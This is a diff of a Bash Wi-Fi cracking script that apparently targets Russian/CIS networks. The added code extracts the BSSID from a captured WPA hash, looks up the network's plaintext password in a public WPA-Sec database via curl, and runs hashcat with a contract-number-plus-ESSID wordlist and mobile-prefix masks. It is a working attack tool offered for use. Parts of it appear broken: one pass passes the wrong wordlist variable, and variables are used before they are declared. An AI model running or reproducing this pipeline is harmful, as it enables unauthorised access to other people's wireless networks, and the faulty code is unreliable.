@@ -204,12 +204,65 @@ run_wifi_crack_pipeline() {
         return 1
     fi
 
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Querying public hash intelligence (WPA-Sec Database)...${NC}" >&2
+    local extracted_bssid=""
+    local first_hash_line=$(head -n 1 "$hc_target_linux" 2>/dev/null)
+    if [[ "$first_hash_line" == WPA* ]]; then
+        extracted_bssid=$(echo "$first_hash_line" | awk -F'*' '{print $4}' | tr -d ':' | tr '[:upper:]' '[:lower:]')
+    fi
+
     local hc_mode=22000
     if [[ "$cap_file" != *.hc22000 ]] && ! command -v hcxpcapngtool >/dev/null 2>&1; then
         hc_mode=2500
     fi
 
-    # Профиль нагрузки -w 4 (максимум) + жесткая привязка к GPU #1
+    if [ -n "$extracted_bssid" ]; then
+        local wpa_sec_resp
+        local clean_bssid=$(echo "$extracted_bssid" | tr '[:upper:]' '[:lower:]')
+        wpa_sec_resp=$(curl -s --connect-timeout 5 "https://stanev.org/?api&bssid=${clean_bssid}" 2>/dev/null)
+
+        if [ -n "$wpa_sec_resp" ] && echo "$wpa_sec_resp" | grep -q ":"; then
+            local found_pass=$(echo "$wpa_sec_resp" | awk -F':' '{print $3}')
+
+            if [ -n "$found_pass" ] && [ ${#found_pass} -ge 8 ]; then
+                echo -e "${TXT_VOID}║${NC}   ${TXT_SCARLET}[ ++ ] PUBLIC DB MATCH: Password found in WPA-Sec!${NC}" >&2
+                rm -f "$hc_target_linux" 2>/dev/null
+                echo "SUCCESS:${found_pass}"
+                return 0
+            else
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ i ] Network is cracked in global DB, but password fields are unreadable.${NC}" >&2
+            fi
+        else
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ ~ ] No direct match in public WPA-Sec registry. Proceeding to local hardware compute.${NC}" >&2
+        fi
+    fi
+
+    if [ -n "$extracted_essid" ]; then
+        local contract_wl_linux="${work_dir}/contract_comb_${current_pid}.txt"
+        local contract_wl_target="$contract_wl_linux"
+        if [ "$runner" == "WSL_WINDOWS" ]; then
+            contract_wl_target="C:\\hashcat\\work\\contract_comb_${current_pid}.txt"
+        fi
+
+        local clean_essid=$(echo "$extracted_essid" | tr -d '\r\n')
+
+        for i in {000000..999999}; do
+            echo "${i}${clean_essid}" >> "$contract_wl_linux"
+            echo "${clean_essid}${i}" >> "$contract_wl_linux"
+        done
+
+        _run_hashcat_with_speedometer "$runner" "PASS 0.5/5: Contract (6-Digits) + ESSID Combo" -m "$hc_mode" "${base_hw_opt[@]}" -a 0 "$win_target" "$dates_wl_target"
+        rm -f "$contract_wl_linux" 2>/dev/null
+
+        cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
+        if [ -n "$cracked_wifi" ]; then
+            local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+            rm -f "$hc_target_linux" 2>/dev/null
+            echo "SUCCESS:${clear_pass}"
+            return 0
+        fi
+    fi
+
     local base_hw_opt=("-w" "4" "-d" "1" "--status" "--status-timer=1")
 
     local cracked_wifi
@@ -224,6 +277,8 @@ run_wifi_crack_pipeline() {
     fi
 
     _coolant_dispense_speak
+
+
 
     # ==========================================
     # PASS 1: Быстрая маска 8 цифр (00000000 - 99999999)
@@ -249,30 +304,24 @@ run_wifi_crack_pipeline() {
     # ==========================================
     # PASS 2: Популярные мобильные префиксы (+79/89)
     # ==========================================
+    local mask_mobile_linux="${work_dir}/mask_mobile_bundle_${current_pid}.hcmask"
+    local mask_mobile_target="$mask_mobile_linux"
+    if [ "$runner" == "WSL_WINDOWS" ]; then
+        mask_mobile_target="C:\\hashcat\\work\\mask_mobile_bundle_${current_pid}.hcmask"
+    fi
+
+    # Вместо цикла генерируем единый файл масок
     local mobile_prefixes=(
         "7914" "7924" "7909" "7962" "7929" "7913" "7999" "7902" "7903" "7905" "7906" "7908"
         "7910" "7911" "7912" "7915" "7916" "7917" "7918" "7920" "7921" "7925" "7926" "7950"
-        "8914" "8924" "8909" "8962" "8999" "8902" "8903" "8905" "8916" "8926" "8950"
+        "8914" "8924" "8909" "8962" "8999" "8902" "8903" "8905" "8916" "8926" "8950" "8994" "7994"
     )
     for prefix in "${mobile_prefixes[@]}"; do
-        local mask_mobile_linux="${work_dir}/mask_mob_${prefix}_${current_pid}.hcmask"
-        local mask_mobile_target="$mask_mobile_linux"
-        if [ "$runner" == "WSL_WINDOWS" ]; then
-            mask_mobile_target="C:\\hashcat\\work\\mask_mob_${prefix}_${current_pid}.hcmask"
-        fi
-        echo "${prefix}?d?d?d?d?d?d?d" > "$mask_mobile_linux"
-
-        _run_hashcat_with_speedometer "$runner" "PASS 2/6: CIS Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_mobile_target"
-        rm -f "$mask_mobile_linux" 2>/dev/null
-
-        cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
-        if [ -n "$cracked_wifi" ]; then
-            local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
-            rm -f "$hc_target_linux" 2>/dev/null
-            echo "SUCCESS:${clear_pass}"
-            return 0
-        fi
+        echo "${prefix}?d?d?d?d?d?d?d" >> "$mask_mobile_linux"
     done
+
+    _run_hashcat_with_speedometer "$runner" "PASS 2/5: CIS Mobile Masks" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_mobile_target"
+    rm -f "$mask_mobile_linux" 2>/dev/null
 
     # ==========================================
     # PASS 3: Словари с правилом best66.rule
